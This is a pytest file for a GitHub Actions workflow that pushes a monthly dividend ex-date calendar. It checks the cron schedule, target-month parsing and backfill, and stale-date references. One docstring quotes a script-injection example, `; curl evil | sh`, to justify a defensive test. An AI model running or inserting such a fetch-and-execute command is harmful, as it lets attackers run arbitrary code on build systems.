"""v19.537:除息行事曆推播「排程日 ↔ 目標月」配對 + 手動補送月份(target_month)。

## 這個檔案在守什麼(為什麼會有這一組測試)

`.github/workflows/dividend_calendar_notify.yml` 的 **cron** 與
`scripts/dividend_calendar_notify.main()` 算出來的**目標月**是**一組配對**,
只准這兩種組合:

    月底(28 號)發 → **下個月**      ← 現行
    月初(1 號)發  → **本月**

**「月初發下個月」是被 user 2026-09-01 明確否決的組合**
(「我想要月底發布下個月的配息基準日,不然就是月初例如 1 號發布這個月的配息基準日,
絕對不會是月初發布下個月」)。

**成因(這組測試存在的理由)**:workflow 2026-08-13 建立時是「1 號發本月」,
2026-08-24 commit `2ec9819`(PR #705)把目標月改成**下個月**,**cron 沒有跟著改** →
悄悄變成「1 號發下個月」;而且 8/1 workflow 還不存在、9/1 那次送的是 10 月,
於是 **2026 年 9 月的行事曆永遠不會被自動送出**(只能靠 `target_month` 補送)。
→ 只改一邊不會有任何東西報錯,所以要用測試把 cron 字面值鎖住。

## 附帶守的三件事
1. `target_month`(手動補送):留空 = 下個月;格式錯 → **exit 2 報錯**,
   **不可**靜默退回下個月(§1:讓 user 以為補送成功卻收到別的月份 = 最糟的失敗模式)。
2. `ref_year/ref_month/ref_day` = **執行當下**,**不跟著目標月跑**(陳舊度量測基準)。
3. workflow 沒有把 user 可控的 `target_month` 插進 `run:` 指令列(script injection)。
"""
from __future__ import annotations

import datetime as _dt
import re
import subprocess
import sys
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(_ROOT))

import fund_fetcher  # noqa: F401,E402  (prime latent 互 import,與其他 notify 測試同)
from scripts import dividend_calendar_notify as M  # noqa: E402

WORKFLOW = _ROOT / ".github" / "workflows" / "dividend_calendar_notify.yml"

# 「28 號 00:23 UTC = 台灣 28 號 08:23」。改這個常數前先讀本檔開頭的配對說明。
EXPECTED_CRON = "23 0 28 * *"


# ══════════════════════════════════════════════════════════════════════
# 1. cron 漂移鎖 —— 排程日與目標月是一組配對
# ══════════════════════════════════════════════════════════════════════
def _workflow_text() -> str:
    return WORKFLOW.read_text(encoding="utf-8")


def test_cron_is_28th_0023_utc():
    """cron 必須是 `23 0 28 * *`(台灣 28 號 08:23)。

    **28 號**:2 月沒有 29~31 號 → 固定 28 號才保證每月觸發**恰好一次**,
              不必再寫「今天是不是當月最後一天」的判斷(29/30/31 會讓 2 月整月漏發)。
    **分鐘 23**:GitHub 官方文件明列排程在**整點**為高負載時段,會延遲甚至直接丟棄 job;
              本 repo 實測整點的 `update_macro_history.yml`,13 次觸發沒有一次在 62 分鐘內
              起跑(中位數 144 分鐘、最長 693 分鐘)。錯開整點。
    **配對**:28 號 ⇔ 推「下個月」(`scripts/dividend_calendar_notify.main`)。
              要改成 1 號,目標月必須同時改回「本月」,否則就是 user 否決的
              「月初發下個月」——2026-08-24 只改一邊正是本次事故。
    """
    crons = re.findall(r"^\s*-\s*cron:\s*[\"']([^\"']+)[\"']\s*$", _workflow_text(), re.M)
    assert crons == [EXPECTED_CRON], (
        f"除息行事曆 cron 漂移:{crons} != ['{EXPECTED_CRON}']。"
        "排程日與 main() 目標月是一組配對(28 號 ⇔ 下個月 / 1 號 ⇔ 本月),"
        "只改一邊會變成 user 2026-09-01 否決的「月初發下個月」。"
    )


def test_cron_day_of_month_never_skips_february():
    """cron 的「日」欄不可 > 28 —— 2 月沒有 29~31 號,填了就會整月漏發。"""
    cron = re.search(r"cron:\s*[\"']([^\"']+)[\"']", _workflow_text()).group(1)
    _dom = cron.split()[2]
    assert _dom.isdigit() and 1 <= int(_dom) <= 28, f"日欄 {_dom!r} 不保證每月都觸發"


def test_cron_minute_avoids_top_of_hour():
    """分鐘不可為 0 —— 整點是 GitHub 排程高負載時段,會延遲甚至丟棄 job。"""
    cron = re.search(r"cron:\s*[\"']([^\"']+)[\"']", _workflow_text()).group(1)
    assert cron.split()[0] != "0", "整點排程實測延遲中位數 144 分鐘、最長 693 分鐘 → 錯開"


def test_workflow_comment_states_the_pairing():
    """§1:註解必須寫明「28 號 ↔ 下個月」的配對,否則下一個人又只改一半。"""
    _t = _workflow_text()
    assert "28" in _t and "下個月" in _t and "配對" in _t


def test_workflow_yaml_parses_and_declares_target_month():
    """YAML 合法 + `workflow_dispatch` 有 target_month(預設空 = 下個月)。"""
    yaml = pytest.importorskip("yaml")           # pyyaml 為 pre-commit 傳遞依賴,缺則略過
    doc = yaml.safe_load(_workflow_text())
    # ⚠️ YAML 1.1 會把裸 `on:` 解析成布林 True(不是字串 "on")—— 兩種都接。
    on_cfg = doc.get("on") if "on" in doc else doc.get(True)
    assert on_cfg["schedule"] == [{"cron": EXPECTED_CRON}]
    _inputs = on_cfg["workflow_dispatch"]["inputs"]
    assert "target_month" in _inputs, "缺 target_month → 手動觸發也只能送下個月,無法補送"
    assert _inputs["target_month"]["default"] == "", "預設須為空字串(= 走排程的下個月)"
    assert "YYYY-MM" in _inputs["target_month"]["description"]


def test_target_month_never_interpolated_into_run_command():
    """**安全**:user 可控的 target_month 不可用 `${{ }}` 插進 `run:` 指令列。

    GitHub Actions 的 `${{ }}` 是在 shell 執行**之前**做字串代換 → 填
    `; curl evil | sh` 之類就會被當指令跑(script injection)。正確做法是走 `env:`,
    由 Python 讀 `os.environ`。(既有 dry_run 那條插值只產出固定字面值 `--dry-run` / `''`,
    不含 user 輸入,不在此限。)
    """
    _t = _workflow_text()
    # run: 區塊(到下一個同縮排 key 或檔尾)
    _run = _t[_t.index("        run: >"):]
    assert "target_month" not in _run, "target_month 被插進 run: 指令列 → script injection"
    assert "TARGET_MONTH: ${{ github.event.inputs.target_month }}" in _t, "應改走 env 傳遞"


# ══════════════════════════════════════════════════════════════════════
# 2. _resolve_target_month —— 純函式
# ══════════════════════════════════════════════════════════════════════
def _now(y, m, d):
    return _dt.datetime(y, m, d, 8, 23, tzinfo=_dt.timezone(_dt.timedelta(hours=8)))


@pytest.mark.parametrize("raw", [None, "", "   "])
def test_unspecified_means_next_month(raw):
    assert M._resolve_target_month(_now(2026, 9, 28), raw) == (2026, 10)


def test_unspecified_december_rolls_to_next_year():
    assert M._resolve_target_month(_now(2026, 12, 28), None) == (2027, 1)


def test_unspecified_february_28_gives_march():
    assert M._resolve_target_month(_now(2026, 2, 28), None) == (2026, 3)


@pytest.mark.parametrize("raw,want", [("2026-09", (2026, 9)), ("2027-01", (2027, 1)),
                                      (" 2026-12 ", (2026, 12))])
def test_explicit_month_is_used_verbatim(raw, want):
    assert M._resolve_target_month(_now(2026, 9, 1), raw) == want


@pytest.mark.parametrize("bad", ["2026-13", "2026-00", "202609", "abc", "2026-9",
                                 "26-09", "2026/09", "1999-05", "2101-05", "2026-09-01"])
def test_bad_format_raises_and_never_falls_back(bad):
    """§1:格式錯 → raise,**不可**靜默回「下個月」(那會讓 user 收到別的月份還以為成功)。"""
    with pytest.raises(ValueError) as _ei:
        M._resolve_target_month(_now(2026, 9, 1), bad)
    assert bad.strip() in str(_ei.value) or repr(bad) in str(_ei.value), "錯誤訊息須帶原始值"


# ══════════════════════════════════════════════════════════════════════
# 3. main() 實跑 —— 凍結時間 + 攔截 build_month_calendar 實參
# ══════════════════════════════════════════════════════════════════════
def _divs(day=14, n=12):
    y, m, out = 2025, 1, []
    for _ in range(n):
        out.append({"ex_date": _dt.date(y, m, day).isoformat(),
                    "pay_date": _dt.date(y, m, day).isoformat(), "amount": 0.05, "yield_pct": 6.0})
        m += 1
        if m > 12:
            m, y = 1, y + 1
    return out


def _run_main(monkeypatch, *, now, argv=("--dry-run",), env=None):
    """凍結 now → 跑 main(dry-run,不觸網)→ 回傳 (rc, 攔到的 build_month_calendar 實參)。"""
    import scripts.weekly_switch_notify as W
    import services.dividend_calendar as DC

    monkeypatch.setattr(W, "_load_client_and_sheet", lambda: ("client", "sid"))
    monkeypatch.setattr(W, "_read_holdings", lambda c, s: ["TLZF9"])
    monkeypatch.setattr(W, "_read_watchlist", lambda: [])
    monkeypatch.setattr(M, "_fetch_divs",
                        lambda codes: [{"code": c, "name": f"{c}基金", "house": "",
                                        "dividends": _divs()} for c in codes])
    monkeypatch.setattr(M, "_now_tw", lambda: now)
    monkeypatch.delenv(M._TARGET_MONTH_ENV, raising=False)
    for k, v in (env or {}).items():
        monkeypatch.setenv(k, v)

    seen = {}
    _real = DC.build_month_calendar

    def _spy(funds, year, month, **kw):
        seen.update({"year": year, "month": month, **kw})
        return _real(funds, year, month, **kw)
    monkeypatch.setattr(DC, "build_month_calendar", _spy)
    rc = M.main(list(argv))
    return rc, seen


@pytest.mark.parametrize("fire,want", [
    ((2026, 9, 28), (2026, 10)),      # 一般月
    ((2026, 12, 28), (2027, 1)),      # 跨年
    ((2026, 2, 28), (2026, 3)),       # 2 月(cron 選 28 號的理由:2 月也一定觸發)
])
def test_scheduled_fire_targets_next_month(monkeypatch, fire, want):
    rc, seen = _run_main(monkeypatch, now=_now(*fire))
    assert rc == 0
    assert (seen["year"], seen["month"]) == want


def test_scheduled_fire_ref_is_today_not_target_month(monkeypatch):
    """ref_* = 執行當下(陳舊度量測基準),**不是**目標月。"""
    rc, seen = _run_main(monkeypatch, now=_now(2026, 9, 28))
    assert rc == 0
    assert (seen["ref_year"], seen["ref_month"], seen["ref_day"]) == (2026, 9, 28)


def test_manual_backfill_september(monkeypatch):
    """user 的實際情境:2026-09-01 手動補送 9 月 → 目標月 9 月,ref 仍是 9/1。

    ref 若跟著目標月跑會實質誤判:月配、last_ex=2026-05-11、於 2026-09-01 量測 —
    ref=2026-09 day=1 → stale 3 個月 / too_stale=False(正確);
    ref=2026-09 day=15 → 4 / True;ref=2026-10 day=15 → 5 / True(整檔被當「疑停配」消失)。
    """
    rc, seen = _run_main(monkeypatch, now=_now(2026, 9, 1),
                         argv=("--dry-run", "--target-month", "2026-09"))
    assert rc == 0
    assert (seen["year"], seen["month"]) == (2026, 9)
    assert (seen["ref_year"], seen["ref_month"], seen["ref_day"]) == (2026, 9, 1)


def test_target_month_via_env(monkeypatch):
    """workflow 走 env 傳(防 shell injection)→ Python 端必須讀得到。"""
    rc, seen = _run_main(monkeypatch, now=_now(2026, 9, 1), env={"TARGET_MONTH": "2026-09"})
    assert rc == 0 and (seen["year"], seen["month"]) == (2026, 9)


def test_empty_env_is_treated_as_unspecified(monkeypatch):
    """schedule 觸發時 `${{ inputs.target_month }}` 是 null → env 為空字串。

    **排程路徑絕不能因此炸掉**,必須當成「未指定」走下個月。
    """
    rc, seen = _run_main(monkeypatch, now=_now(2026, 9, 28), env={"TARGET_MONTH": ""})
    assert rc == 0 and (seen["year"], seen["month"]) == (2026, 10)


def test_cli_flag_overrides_env(monkeypatch):
    rc, seen = _run_main(monkeypatch, now=_now(2026, 9, 1),
                         argv=("--dry-run", "--target-month", "2026-09"),
                         env={"TARGET_MONTH": "2027-05"})
    assert rc == 0 and (seen["year"], seen["month"]) == (2026, 9)


@pytest.mark.parametrize("bad", ["2026-13", "202609", "abc"])
def test_bad_target_month_exits_2_before_any_fetch(monkeypatch, bad, capsys):
    """格式錯 → exit 2、**完全不抓資料也不推播**,錯誤訊息帶原始值(§1)。"""
    import scripts.weekly_switch_notify as W
    monkeypatch.delenv(M._TARGET_MONTH_ENV, raising=False)
    _touched = []
    monkeypatch.setattr(W, "_load_client_and_sheet", lambda: _touched.append("sheet") or (None, ""))
    monkeypatch.setattr(M, "_fetch_divs", lambda codes: _touched.append("fetch") or [])
    monkeypatch.setattr(M, "_now_tw", lambda: _now(2026, 9, 1))
    rc = M.main(["--dry-run", "--target-month", bad])
    assert rc == 2 and _touched == []
    assert bad in capsys.readouterr().err              # 訊息要指出收到的原始值


def test_bad_target_month_via_env_also_exits_2(monkeypatch):
    monkeypatch.setenv("TARGET_MONTH", "2026-13")
    monkeypatch.setattr(M, "_now_tw", lambda: _now(2026, 9, 1))
    assert M.main(["--dry-run"]) == 2


def test_cli_end_to_end_nonzero_exit():
    """真的用 subprocess 跑一次 —— 確認非 0 離開碼會傳到 GitHub Actions(不是只回傳值)。"""
    _p = subprocess.run([sys.executable, "scripts/dividend_calendar_notify.py",
                         "--dry-run", "--target-month", "2026-13"],
                        cwd=str(_ROOT), capture_output=True, text=True, timeout=180)
    assert _p.returncode != 0, _p.stdout
    assert "2026-13" in _p.stderr and "target_month" in _p.stderr
